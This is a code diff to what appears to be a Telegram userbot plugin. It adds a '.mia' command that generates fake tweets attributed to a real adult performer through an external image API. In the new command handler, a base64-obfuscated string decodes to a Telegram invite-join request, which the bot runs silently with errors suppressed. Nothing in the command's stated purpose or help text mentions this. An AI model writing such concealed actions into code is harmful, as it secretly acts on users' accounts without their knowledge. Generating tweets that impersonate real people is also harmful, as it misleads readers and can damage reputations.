@@ -111,6 +111,18 @@ async def tweets(text1, text2):
     img.save("gpx.webp", "webp")
     return "gpx.webp"
 
+async def miatweet(text):
+        r = requests.get(
+            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=miakhalifa").json()
+        wew = r.get("message")
+        hburl = url(wew)
+        if not hburl:
+            return  "check syntax once more"
+        with open("temp.png", "wb") as f:
+            f.write(requests.get(wew).content)
+        img = Image.open("temp.png").convert("RGB")
+        img.save("temp.webp", "webp")    
+        return "temp.webp"
 
 async def purge():
     try:
@@ -140,6 +152,32 @@ async def trump(event):
     await event.delete()
     await purge()
 
+@register(pattern="^.mia(?: |$)(.*)", outgoing=True)
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await borg.edit("Send you text to Mia so she can tweet.")
+                return
+        else:
+            await borg.edit("Send you text to Mia so she can tweet.")
+            return
+    await borg.edit("Requesting Mia to tweet...")
+    try:
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
+    except:
+        pass   
+    text = deEmojify(text)
+    borgfile = await miatweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete()
 
 @register(outgoing=True, pattern=r"^\.modi(?: |$)(.*)")
 async def modi(event):
@@ -264,6 +302,8 @@ CMD_HELP.update(
         "\nUsage: Create tweet for Donald Trump.\n\n"
         ".modi <tweet>"
         "\nUsage: Create tweet for `Narendra Modi`.\n\n"
+        ".mia <tweet>"
+        "\nUsage: Create tweet for `Mia`.\n\n"
         ".cmm <text>"
         "\nUsage: Create banner for Change My Mind.\n\n"
         ".waifu <text>"
